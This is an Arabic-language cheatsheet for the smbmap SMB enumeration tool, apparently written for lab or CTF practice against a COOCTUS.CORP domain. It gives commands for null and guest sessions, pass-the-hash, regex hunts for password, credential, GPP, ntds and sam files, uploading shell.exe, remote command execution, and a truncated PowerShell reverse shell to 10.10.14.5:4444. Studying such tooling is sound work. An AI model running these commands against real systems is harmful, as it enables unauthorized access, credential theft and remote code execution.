




# 🗺️ SMBmap Cheatsheet

> **الأداة:** smbmap — Samba Share Enumerator  
> **الاستخدام:** تعداد وتصفح الـ SMB shares مع أو بدون credentials

---

## 1. الاتصال الأساسي

```bash
# Null session (بدون مستخدم)
smbmap -H $IP

# Anonymous / Guest
smbmap -H $IP -u '' -p ''
smbmap -H $IP -u guest -p ''

# بـ credentials
smbmap -H $IP -u admin -p 'password123'

# مع domain
smbmap -H $IP -u Visitor -p 'GuestLogin!' -d COOCTUS.CORP

# Pass-the-Hash
smbmap -H $IP -u admin -p 'LM:NT'
smbmap -H $IP -u admin -p 'aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c'

# بورت مختلف
smbmap -H $IP -P 4445 -u user -p pass
```

---

## 2. عرض الـ Shares

```bash
# قائمة الـ shares فقط (بدون محتوى)
smbmap -H $IP
smbmap -H $IP -u user -p pass -L

# Non-recursive — محتوى share واحد (مستوى واحد)
smbmap -H $IP -u user -p pass -r Home
smbmap -H $IP -u user -p pass -r 'C$\Users\Public'

# Recursive — كل الملفات جوا share
smbmap -H $IP -u user -p pass -R Home
smbmap -H $IP -u user -p pass -R SYSVOL

# Recursive كل الـ shares مع depth
smbmap -H $IP -u user -p pass -R --depth 5
smbmap -H 10.114.139.89 -u Visitor -p 'GuestLogin!' -d COOCTUS.CORP -r --depth 5
smbmap -H $IP -u user -p pass -R --depth 10
```


```bash
# Recursive الصحيح في v1.10.7
smbmap -H 10.114.139.89 -u Visitor -p 'GuestLogin!' -d COOCTUS.CORP -r --depth 5

# share محدد
smbmap -H 10.114.139.89 -u Visitor -p 'GuestLogin!' -d COOCTUS.CORP -r SYSVOL --depth 10

smbmap -H 10.114.139.89 -u Visitor -p 'GuestLogin!' -d COOCTUS.CORP -r Home --depth 10

smbmap -H 10.114.139.89 -u Visitor -p 'GuestLogin!' -d COOCTUS.CORP -r NETLOGON --depth 10

# مع بحث عن ملفات حساسة
smbmap -H 10.114.139.89 -u Visitor -p 'GuestLogin!' -d COOCTUS.CORP -r SYSVOL --depth 10 -A '(?i).*(Groups\.xml|\.bat|\.ps1|password).*'
```


---

## 3. البحث عن ملفات حساسة

```bash
# بحث بـ regex — أي ملف
smbmap -H $IP -u user -p pass -R --depth 10 -A '(?i).*.*'

# ملفات passwords و credentials
smbmap -H $IP -u user -p pass -R --depth 10 \
  -A '(?i).*(pass|cred|secret|config|key).*\.(txt|xml|ini|conf|cfg|json)'

# logs فقط
smbmap -H $IP -u user -p pass -R -s anonymous --depth 12 \
  -A '(?i).*log.*'

# GPP passwords (SYSVOL)
smbmap -H $IP -u user -p pass -R -s SYSVOL --depth 10 \
  -A 'Groups\.xml'

# كل شي حساس
smbmap -H $IP -u user -p pass -R --depth 12 \
  -A '(?i).*(pass|cred|secret|shadow|ntds|sam|key|token|hash|config|backup).*'
```

---

## 4. تحميل وتحميل الملفات

```bash
# تحميل ملف (download)
smbmap -H $IP -u user -p pass --download 'Public\passwords.txt'
smbmap -H $IP -u user -p pass --download 'Home\notes\important.txt'

# اسم فيه مسافة
smbmap -H $IP -u user -p pass --download "Bob Share\Draft Contract.txt"

# رفع ملف (upload) — تحتاج WRITE
smbmap -H $IP -u user -p pass --upload '/tmp/shell.exe' 'C$\temp\shell.exe'

# حذف ملف — تحتاج صلاحيات
smbmap -H $IP -u user -p pass --delete 'C$\temp\old.exe'
```

---

## 5. تنفيذ أوامر (تحتاج Admin)

```bash
# تنفيذ أمر عبر WMI
smbmap -H $IP -u admin -p pass -x 'whoami'
smbmap -H $IP -u admin -p pass -x 'ipconfig /all'
smbmap -H $IP -u admin -p pass -x 'net group "Domain Admins" /domain'

# عبر PsExec
smbmap -H $IP -u admin -p pass -x 'whoami' --mode psexec

# Reverse shell
smbmap -H $IP -u admin -p pass \
  -x 'powershell -c "$c=New-Object Net.Sockets.TCPClient(\"10.10.14.5\",4444)..."'
```

---

## 6. Drive Listing

```bash
# قائمة الـ drives المتاحة
smbmap -H $IP -u admin -p pass -L
```

---

## 7. البحث في محتوى الملفات

```bash
# بحث عن كلمة "password" داخل الملفات (بطيء)
sudo smbmap -H $IP -u admin -p pass \
  -F '[Pp]assword' --search-path 'C:\Users' --search-timeout 120

# بحث مع depth محدد
sudo smbmap -H $IP -u admin -p pass \
  -F '[Pp]assword' --search-path 'C:\Users' --depth 7 --search-timeout 120
```

---

## 8. استثناء Shares معينة

```bash
# تجاهل ADMIN$ و IPC$
smbmap -H $IP -u user -p pass -R --depth 9 --exclude 'ADMIN$' 'IPC$'
```

---

## 9. عدة Hosts

```bash
# من ملف hosts
smbmap --host-file targets.txt -u user -p pass -R --depth 8
smbmap --host-file targets.txt -u user -p pass --csv results.csv
```

---

## 10. حفظ النتائج

```bash
# حفظ CSV
smbmap -H $IP -u user -p pass -r 'C$' --csv smb_results.csv

# حفظ مع grep
smbmap -H $IP -u user -p pass -R --depth 10 | tee smbmap_output.txt
```

---

## 11. مرجع سريع — الفرق بين -r و -R

|الأمر|المعنى|
|---|---|
|`-r Share`|يعرض محتوى share مستوى واحد فقط|
|`-R Share`|يعرض كل المحتوى بشكل recursive|
|`-R --depth N`|recursive مع حد أقصى N مستوى|
|`-A 'pattern'`|فلتر regex على أسماء الملفات|

---

## 12. ناتج الأخطاء الشائعة

|الناتج|المعنى|
|---|---|
|`NO ACCESS`|ما عندك صلاحية على هذا الـ share|
|`READ ONLY`|تقدر تقرأ فقط|
|`READ, WRITE`|تقدر تقرأ وترفع ملفات|
|`Access denied`|الـ credentials غلط أو مسدود|
|`NULL Session`|اتصال بدون مستخدم نجح|
|`Authenticated`|الـ credentials صحيحة|
|`Guest session`|دخلت كـ guest|

---

## 13. Workflow كامل

```bash
IP=10.114.139.89
USER=Visitor
PASS='GuestLogin!'
DOMAIN=COOCTUS.CORP

# 1. شوف الـ shares والصلاحيات
smbmap -H $IP -u $USER -p $PASS -d $DOMAIN

# 2. تصفح كل share عنده READ
smbmap -H $IP -u $USER -p $PASS -d $DOMAIN -r Home
smbmap -H $IP -u $USER -p $PASS -d $DOMAIN -r SYSVOL
smbmap -H $IP -u $USER -p $PASS -d $DOMAIN -r NETLOGON

# 3. recursive مع بحث عن ملفات حساسة
smbmap -H $IP -u $USER -p $PASS -d $DOMAIN \
  -R --depth 10 -A '(?i).*(pass|cred|secret|key).*'

# 4. حمّل الملفات اللي تلقتها
smbmap -H $IP -u $USER -p $PASS --download 'Home\important.txt'

# 5. SYSVOL دايماً تفحصه
smbmap -H $IP -u $USER -p $PASS -R -s SYSVOL --depth 10 \
  -A '(?i).*(Groups\.xml|scripts|bat|ps1).*'
```

---

## 14. مقارنة smbmap مع smbclient

|المهمة|smbmap|smbclient|
|---|---|---|
|عرض الـ shares|`smbmap -H $IP`|`smbclient -L $IP`|
|تصفح recursive|`smbmap -R -H $IP`|`smbclient ... -c "recurse;ls"`|
|تحميل ملف|`--download 'path'`|`get filename`|
|رفع ملف|`--upload src dst`|`put filename`|
|تحميل كل شي|`-A '.*' -R`|`mget *`|
|تنفيذ أمر|`-x 'cmd'`|غير ممكن مباشرة|

---

**المصادر:**

- https://github.com/ShawnDEvans/smbmap






